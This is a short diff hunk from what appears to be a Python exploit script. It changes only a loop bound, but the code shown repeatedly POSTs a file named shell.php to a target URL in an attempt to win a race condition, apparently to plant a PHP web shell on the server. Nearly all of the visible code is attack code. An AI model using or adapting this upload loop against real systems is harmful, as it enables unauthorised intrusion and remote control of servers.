@@ -5,7 +5,7 @@ import sys
 
 print('[+] Trying to win the race')
 f = {'file': open('shell.php', 'rb')}
-for _ in range(4096 * 4096):
+for _ in range(4096**2):
     requests.post('http://target.com/index.php?c=index.php', f)
 
 
